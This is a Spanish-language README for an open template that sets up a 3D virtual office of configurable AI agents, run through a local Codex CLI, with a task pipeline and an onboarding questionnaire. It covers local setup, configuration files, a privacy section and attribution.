# Oficina para empresas

Plantilla de oficina interactiva con equipo 3D, departamentos, pipeline de tareas y un diagnóstico inicial para adaptar el equipo a los procesos de cada negocio. Creada por Samuel Acuña a partir de su oficina de trabajo; esta versión está limpia para que otras empresas la personalicen.

## Qué incluye

- Oficina 3D navegable, salas, puestos, ascensores y controles visuales.
- Pipeline para asignar tareas, revisar entregas y pedir cambios.
- Agentes configurables por puesto y departamento en `data/agents.json`.
- Cuestionario inicial en `public/onboarding.html`. Pregunta por empresa, clientes, objetivos, procesos, herramientas, áreas, tareas delegables, aprobaciones y límites de datos.
- Diagnóstico basado en las respuestas: sugiere áreas y primeros experimentos, y permite guardar el perfil en este navegador o descargarlo como JSON.
- Datos de tareas locales. No viene conectada a correos, CRM, WhatsApp ni cuentas de clientes.

## Puesta en marcha local

Requisitos: Node.js y Codex CLI con una sesión iniciada en la máquina que ejecutará la oficina.

Descarga [el código completo como ZIP](https://github.com/Samuelacuna12/oficina-para-empresas/raw/refs/heads/main/oficina-para-empresas.zip), descomprímelo y en Terminal entra a la carpeta `oficina-para-empresas`. Luego ejecuta:

```sh
node start.mjs
```

Abre `http://127.0.0.1:4521`. Las tareas se procesan mediante Codex CLI local; el navegador no envía datos a un servidor de esta plantilla. La oficina deja de trabajar cuando se apaga la máquina que la ejecuta.

Si `codex` no está en el `PATH`, edita `data/config.json` y define `codexPath` con la ubicación local de Codex CLI. Ajusta también `name`, `timezone` y `model` a tu empresa. Para cambiar cargos, responsabilidades y departamentos, edita `data/agents.json` y `data/departments.json`.

## Cómo usar el diagnóstico

1. Abre **Optimizar oficina** desde el menú.
2. Describe procesos y objetivos de negocio; no pegues claves ni información identificable de clientes.
3. Revisa las sugerencias y valida los responsables con tu equipo.
4. Descarga el JSON como punto de partida. Añade después procedimientos aprobados a los archivos de `notes/`.
5. Prueba una tarea acotada y revisa su entrega antes de ampliar permisos o conectar herramientas.

Las recomendaciones del cuestionario son reglas transparentes sobre tus respuestas, no una auditoría ni una promesa de resultados. Las integraciones externas requieren desarrollo, credenciales propias y pruebas adicionales.

## Privacidad

El repositorio contiene datos de ejemplo genéricos. No subas aquí perfiles empresariales, historiales, conversaciones, credenciales, configuraciones privadas ni archivos de clientes. Los perfiles y tareas locales están excluidos por `.gitignore`.

## Atribución

La oficina 3D incluye Three.js; conserva los avisos de licencia incluidos con sus archivos de distribución.
